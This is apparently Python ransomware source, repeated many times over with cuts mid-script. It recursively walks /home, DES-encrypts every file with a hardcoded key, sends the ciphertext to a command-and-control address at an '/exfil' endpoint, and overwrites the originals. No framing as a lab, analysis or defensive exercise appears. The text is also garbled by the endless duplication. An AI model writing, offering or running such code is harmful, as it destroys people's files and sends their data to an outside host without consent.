            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
DES = DES.new(KEY, DES.MODE_ECB)
BLOCK_SIZE=64

def encrypt_file(filepath):
    print(filepath)
    with open(filepath) as f:
        try:
            padded_text = pad(f.read().encode('UTF-8'), BLOCK_SIZE)
            encrypted_text = DES.encrypt(padded_text)
            r = requests.post(C2+"/exfil", data=encrypted_text)
            with open(filepath, "wb") as w:
                w.write(encrypted_text)
        except Exception as e:
            print(e)
            

def encrypt(start_dir="/home"):
    for f in listdir(start_dir):
        if path.isdir(path.join(start_dir, f)):
            encrypt(path.join(start_dir, f))
        elif path.isfile(path.join(start_dir, f)):
            encrypt_file(path.join(start_dir, f))

def main():
    encrypt()

if __name__ == "__main__":
    exit(main())
#!/usr/bin/env pyrhon3

import inspect
import requests
import sys
from os import listdir, path
from Crypto.Cipher import DES
from Crypto.Util.Padding import pad

C2 = "http://10.10.2.200:110"
KEY = b"11111111"
